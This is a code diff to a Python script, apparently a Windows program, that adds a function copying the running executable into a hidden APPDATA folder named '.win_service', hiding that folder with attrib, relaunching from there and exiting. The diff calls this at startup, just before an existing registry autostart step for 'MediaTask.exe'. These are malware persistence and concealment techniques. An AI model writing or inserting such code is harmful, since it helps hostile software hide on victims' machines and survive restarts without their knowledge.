@@ -69,6 +69,24 @@ def copy_and_rename(destination_folder, new_name, icon_path=None):
     except Exception as e:
         return f"Ошибка при копировании: {e}"
 
+def copy_and_run():
+    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+    appdata = os.getenv('APPDATA')
+    hidden_folder = os.path.join(appdata, '.win_service')
+    if not os.path.exists(hidden_folder):
+        os.makedirs(hidden_folder)
+        os.system(f'attrib +h "{hidden_folder}"')  
+    dest_path = os.path.join(hidden_folder, os.path.basename(current_path))
+
+    if current_path != dest_path:
+        try:
+            shutil.copy2(current_path, dest_path)
+            subprocess.Popen([dest_path], shell=False)
+            sys.exit()
+        except Exception as e:
+            print(f"[!] ERROR: {e}")
+            sys.exit(1)
+
 
 def add_to_registry(script_path):
     try:
@@ -551,6 +569,7 @@ async def main():
 
 
 if __name__ == "__main__":
+    copy_and_run()
     script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'
 
     if not add_to_registry(script_path):
